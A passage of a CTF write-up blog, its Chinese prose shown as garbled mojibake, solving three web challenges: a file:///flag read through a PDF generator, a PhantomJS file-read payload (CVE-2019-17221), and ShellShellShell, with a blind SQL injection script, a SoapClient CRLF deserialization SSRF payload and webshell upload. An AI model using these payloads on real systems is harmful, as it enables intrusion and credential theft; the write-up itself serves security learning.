&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">a&lt;/span> &lt;span style="color:#75af00">rel&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;attachment&amp;#39;&lt;/span> &lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;file:///flag&amp;#39;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°±ç›¸å½“äºŽSSRFè¯·æ±‚äº†ï¼Œå¹¶æŠŠç»“æžœé™„åˆ°pdfä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨binwalkåˆ†ç¦»ä¸€ä¸‹å†…å®¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">binwalk -e xxx.pdf
cat *&lt;span style="color:#111">|&lt;/span>grep flag
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209140940401.png" alt="image-20211209140940401">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://guokeya.github.io/post/HixADj8UG/">wp&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[FireshellCTF2020]ScreenShooter
&lt;/h4>
&lt;/summary>
&lt;p>è·Ÿä¸Šé¢é‚£ä¸ªå‰ç«¯ä¸€æ ·ï¼Œä¸è¿‡åŒºåˆ«æ˜¯ä¼šè¿”å›žæ‹çš„ç…§ç‰‡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209141637106.png" alt="image-20211209141637106">&lt;/p>
&lt;p>çœ‹è¯·æ±‚å¤´ç”¨çš„æ˜¯PhantomJSï¼Œæœåˆ°äº†è¿™æ ·ä¸€ç¯‡ï¼š&lt;a href="https://github.com/h4ckologic/CVE-2019-17221/blob/master/PhantonJS_Arbitrary_File_Read.pdf">PhantonJS_Arbitrary_File_Read.pdf&lt;/a>ï¼Œä¸€ä¸ªå·²çŸ¥çš„cve-2019-17221&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#75715e">&amp;lt;!DOCTYPE html&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">title&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">title&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;text/javascript&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">amiz&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">amiz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">amiz&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">responseText&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#75af00">amiz&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;file:///flag&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼šé€ æˆXHRè¯·æ±‚ï¼Œä»»æ„æ–‡ä»¶è¯»å–&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[De1CTF 2019]ShellShellShell
&lt;/h4>
&lt;/summary>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209165342209.png" alt="image-20211209165342209">&lt;/p>
&lt;p>æ˜¯N1ctf2018çš„easyphp+2018ä¸Šæµ·å¸‚èµ›web3çš„ç¼åˆ+æ”¹ç¼–ï¼Œä¸è¿‡è¿™ä¿©æˆ‘éƒ½æ²¡åšè¿‡ï¼Œè¿™æ˜¯&lt;a href="https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540">N1é¢˜çš„wp&lt;/a>ï¼Œè¿™æ˜¯&lt;a href="https://cloud.tencent.com/developer/article/1360551">web3çš„wp&lt;/a>&lt;/p>
&lt;p>é¦–å…ˆæ˜¯æºç æ³„éœ²&lt;/p>
&lt;pre tabindex="0">&lt;code>/index.php~
/user.php~
/config.php~
/views/index
/views/login
/views/logout
/views/register
/views/profile
/views/publish
/views/delete
/views/phpinfo
&lt;/code>&lt;/pre>&lt;p>åœ¨user.phpä¸­æœ‰å¾ˆå¤šsqlçš„æ“ä½œï¼Œç»“åˆè¿™äº›å‡½æ•°æˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸€ä¸ªåä¸ºctf_usersdçš„è¡¨ï¼Œæœ‰username, password, allow_diff_ip, id, is_admin, ipè¿™å‡ åˆ—ï¼›åœ¨registerå‡½æ•°é¢å¤–æœ‰å‡ºé¢˜äººçš„ä¸€ä¸ªæ³¨é‡Šåšæç¤ºç”¨ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸€å¥ç›´æŽ¥æŠŠis_adminèµ‹å€¼ä¸º0&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209182038835.png" alt="image-20211209182038835">&lt;/p>
&lt;p>è·Ÿå…¥config.phpçœ‹æœ‰å…³äºŽsqlçš„å¤„ç†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209181300244.png" alt="image-20211209181300244">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209182606221.png" alt="image-20211209182606221">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211209183227753.png" alt="image-20211209183227753">&lt;/p>
&lt;p>åŒ¹é…åå¼•å·ç„¶åŽä¼šè¢«æ›¿æ¢ä¸ºå•å¼•å·ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠæˆ‘ä»¬sqlæ³¨å…¥çš„payloadç”±å•å¼•å·æ¢æˆåå¼•å·å³å¯&lt;/p>
&lt;p>ç”±äºŽæ³¨å†Œæˆä¸æˆåŠŸä»€ä¹ˆçš„å›žæ˜¾æ²¡æœ‰å·®åˆ«ï¼Œæ‰€ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨ï¼›å¦å¤–è¿™é‡Œæœ‰ä¸¤ä¸ªåœ°æ–¹éƒ½å¯ä»¥sqliï¼Œä¸€ä¸ªæ˜¯register()å¤„ä¸€ä¸ªæ˜¯publishå¤„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210090633660.png" alt="image-20211210090633660">&lt;/p>
&lt;p>publishè¿™é‡Œæ˜¯æ³¨å†ŒåŽå°±å¯ä»¥ç›´æŽ¥ä¼ å‚ï¼Œè€Œregisteré‚£é‡Œè¿˜è¦ç”¨md5ä¸åœåœ°ç”ŸæˆéªŒè¯ç ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©æ³¨å†Œä¸€ä¸ªå·ç„¶åŽç”¨publishè¿™é‡Œä½œä¸ºæ³¨å…¥ç‚¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">hashlib&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">md5_val&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">999999&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">100000000&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">md5_value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">hashlib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hexdigest&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">md5_value&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">md5_val&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ac7a2&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ—¶é—´ç›²æ³¨å»ºè®®è¿˜æ˜¯ä¸¤ä¸ªforå¾ªçŽ¯å§ï¼ŒäºŒåˆ†ä¸çŸ¥é“ä¸ºå•¥ä¸€ç›´å‡ºé—®é¢˜&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://a4a900d6-ddc6-42eb-b95c-7e63d56d9bba.node4.buuoj.cn:81/index.php?action=publish&amp;#34;&lt;/span>
&lt;span style="color:#111">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;PHPSESSID&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;5j1p272lfmi425cpmkv9lik9o7&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">k&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">k&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;mood&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#39;0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;signature&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#39;1`,if(ascii(substr((select password from ctf_users where username=`admin`),&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">,1))=&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">,sleep(3),0))#&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">cookie&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">timeout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è·‘å‡ºæ¥md5è§£å¯†åŽå¾—åˆ°jaivypassword&lt;/p>
&lt;p>æœ‰å¯†ç å’Œè´¦å·å´ç™»ä¸äº†ï¼Œå› ä¸ºä»–åœ¨sqlè¡¨ä¸­è®¾ç½®äº†&lt;code>allow_diff_ip&lt;/code>ï¼Œåªæœ‰ç®¡ç†å‘˜åœ°å€æ‰å¯ä»¥ï¼Œå¹¶ä¸”ä½¿ç”¨äº†&lt;code>$_SERVER['REMOTE_ADDR']&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210093956425.png" alt="image-20211210093956425">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210094111483.png" alt="image-20211210094111483">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210094124067.png" alt="image-20211210094124067">&lt;/p>
&lt;p>æ²¡æ³•xffç»•è¿‡ï¼Œåªèƒ½æ‰¾ä¸€å¤„ssrfçš„ç‚¹ï¼›ä»Žä¹‹å‰çš„phpinfoæ³„éœ²å¯ä»¥çœ‹åˆ°å¼€å¯äº†soapæ‰©å±•ï¼ŒçŽ°åœ¨å°±ç¼ºä¸€ä¸ªååºåˆ—åŒ–ç‚¹äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210095343906.png" alt="image-20211210095343906">&lt;/p>
&lt;p>è¿™é‡Œçš„row[2]å°±æ˜¯moodï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å¯ä»¥æŽ§åˆ¶çš„å‚æ•°ï¼Œå°±æ˜¯æ³¨å…¥ç‚¹äº†&lt;/p>
&lt;p>æ“ä½œçš„æ—¶å€™è¦æ³¨æ„ï¼Œpublishæ˜¯ä¸€ä¸ªéœ€è¦ç™»å½•åŽæ‰èƒ½è¿›è¡Œçš„æ“ä½œï¼Œè€Œæˆ‘ä»¬ä¼ å‚æ˜¯ä¸ºäº†è®©adminå¾—ä»¥ç™»å½•ï¼Œè¿™é‡Œé‡‡å–çš„æ–¹å¼æ˜¯ç”¨å¦ä¸€ä¸ªæœªç™»å½•é¡µé¢çš„cookieçš„codeç”Ÿæˆpayloadï¼Œåœ¨å·²ç™»å½•çš„è´¦å·ä¸Špublishå¹¶è§¦å‘ååºåˆ—åŒ–ï¼Œç„¶åŽä¹‹å‰çš„æœªç™»å½•é¡µé¢åˆ·æ–°å³å¯ç›´æŽ¥è¿›å…¥ä¸ªäººä¿¡æ¯é¡µé¢äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$target&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://127.0.0.1/index.php?action=login&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$post_string&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;username=admin&amp;amp;password=jaivypassword&amp;amp;code=1243998&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#39;X-Forwarded-For: 127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;Cookie: PHPSESSID=meailth0scq7kni7m5ihvr7974&amp;#39;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SoapClient&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;location&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;user_agent&amp;#39;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz^^Content-Type: application/x-www-form-urlencoded^^&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;^^&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$headers&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;^^Content-Length: &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$post_string&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;^^^^&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$post_string&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;uri&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;aaab&amp;#34;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$aaa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$aaa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;^^&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$aaa&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$aaa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;amp;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;amp;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$aaa&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">bin2hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$aaa&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210104504684.png" alt="image-20211210104504684">&lt;/p>
&lt;p>ä¹‹åŽadminçš„publishé¡µé¢å¯ä»¥ç›´æŽ¥ä¼ webshellï¼Œæç¤ºflagåœ¨å†…ç½‘ï¼Œç”¨èšå‰‘è¿žæŽ¥æ‰«ä¸€ä¸‹å†…ç½‘&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210104957446.png" alt="image-20211210104957446">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210105227592.png" alt="image-20211210105227592">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210105526356.png" alt="image-20211210105526356">&lt;/p>
&lt;p>åœ¨å¤–ç½‘å°±å¯ä»¥ç›´æŽ¥è®¿é—®äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210105553912.png" alt="image-20211210105553912">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$sandbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/var/sandbox/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;prefix&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">]){&lt;/span>
